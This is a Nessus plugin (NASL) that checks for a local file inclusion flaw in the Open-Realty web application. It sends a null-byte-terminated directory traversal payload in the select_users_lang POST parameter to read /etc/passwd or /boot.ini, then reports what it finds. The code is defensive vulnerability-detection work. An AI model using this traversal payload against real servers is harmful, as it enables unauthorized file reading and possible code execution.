#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(48404);
  script_version("1.13");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");
  script_bugtraq_id(42546);
  script_xref(name:"EDB-ID", value:"14684");

  script_name(english:"Open-Realty index.php select_users_lang Parameter Traversal Local File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a local
file inclusion attack.");
  script_set_attribute(attribute:"description", value:
"The web server hosts Open-Realty, a web-based real estate listing
management application written in PHP. 

At least one install of Open-Realty on the remote host fails to
sanitize user-supplied input to the 'select_users_lang' parameter in
POST requests to the 'index.php' script before using it to include PHP
code. 

Regardless of PHP's 'register_globals' setting, an unauthenticated
remote attacker can leverage this issue to view arbitrary files or
possibly execute arbitrary PHP code on the remote host, subject to the
privileges of the web server user id.");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/08/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/08/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:open-realty:open-realty");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("data_protection.inc");

port = get_http_port(default:80, php:TRUE);


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

traversal = crap(data:"../", length:3*9) + '..';

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/open-realty", "/open_realty", "/realty", cgi_dirs()));
else dirs = make_list(cgi_dirs());

contents = "";
found_app = FALSE;
found_file = "";
vuln_reqs = make_array();

disable_cookiejar();

foreach dir (dirs)
{
  # Verify the script exists.
  url = dir + '/index.php';
  res = http_get_cache(item:url, port:port, exit_on_fail:TRUE);

  if (
    'meta name="Generator" content="Open-Realty"' >< res ||
    '<!--Open-Realty is distributed by Transparent Technologies' >< res ||
    'Powered by <a href="http://open-realty.org"' >< res ||
    '?action=rss_lastmodified_listings title="Last Modified Listings' >< res ||
    'class="featured_listings_horizontal_thumb' >< res
  ) found_app = TRUE;
  else continue;

  # Loop through files to look for.
  foreach file (files)
  {
    # Once we find a file that works, stick with it for any subsequent tests.
    if (found_file && file != found_file) continue;

    # Try to exploit the issue.
    exploit = traversal + file + "%00";
    postdata = 'select_users_lang=' + exploit;

    req = http_mk_post_req(
      port         : port,
      item         : url, 
      content_type : 'application/x-www-form-urlencoded',
      data         : postdata
    );
    res = http_send_recv_req(port:port, req:req, exit_on_fail:TRUE);

    # There's a problem if...
    body = res[2];
    file_pat = file_pats[file];

    if (
      # we see the expected contents or...
      egrep(pattern:file_pat, string:body) ||
      # we get an error because magic_quotes was enabled or...
      traversal+file+"\0/lang.inc.php" >< body ||
      # we get an error claiming the file doesn't exist or...
      file+"): failed to open stream: No such file" >< body ||
      file+") [function.include]: failed to open stream: No such file" >< body ||
      file+") [<a href='function.include'>function.include</a>]: failed to open stream: No such file" >< body ||
      # we get an error about open_basedir restriction.
      file+") [function.include: failed to open stream: Operation not permitted" >< body ||
      file+") [<a href='function.include'>function.include</a>]: failed to open stream: Operation not permitted" >< body ||
      "open_basedir restriction in effect. File("+traversal+file >< body
    )
    {
      vuln_reqs[url] = http_last_sent_request();

      if (!contents && egrep(pattern:file_pat, string:body))
      {
        found_file = file;

        contents = body;
        if ("<!DOCTYPE" >< contents) contents = contents - strstr(contents, "<!DOCTYPE");

        break;
      }
    }
  }
  if (max_index(keys(vuln_reqs)) && !thorough_tests) break;
}
if (!found_app) exit(0, "The web server listening on port "+port+" does not appear to host Open-Realty.");
if (max_index(keys(vuln_reqs)) == 0) exit(0, "No vulnerable installs of Open-Realty were found on the web server on port "+port+".");


# Report findings.
if (report_verbosity > 0)
{
  info = "";
  foreach url (keys(vuln_reqs))
    if ((found_file && found_file >< vuln_reqs[url]) || !found_file) 
      info += '\n' +
        crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n'+
        vuln_reqs[url]+'\n'+
        crap(data:"-", length:30)+" snip "+crap(data:"-", length:30)+'\n';

  if (max_index(keys(vuln_reqs)) > 1) s = "s";
  else s = "";

  if (contents)
  {
    if (os && "Windows" >< os) found_file = str_replace(find:'/', replace:'\\', string:found_file);

  report = '\n' +
    'Nessus was able to exploit the issue to retrieve the contents of\n' +
    "'" + found_file + "' on the remote host using the following request" + s + ' :\n' +
    '\n' +
    info;

    contents = data_protection::redact_etc_passwd(output:contents);
    if (report_verbosity > 1)
      report += '\n' +
        'Here are its contents :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        contents +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
  }
  else
  {
    report += '\n' +
      'While Nessus was not able to exploit the issue, it was able to verify\n' +
      'the issue exists based on the error message' + s + ' from the following\n' +
      'request' + s +' :\n' +
      '\n' +
      info;
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
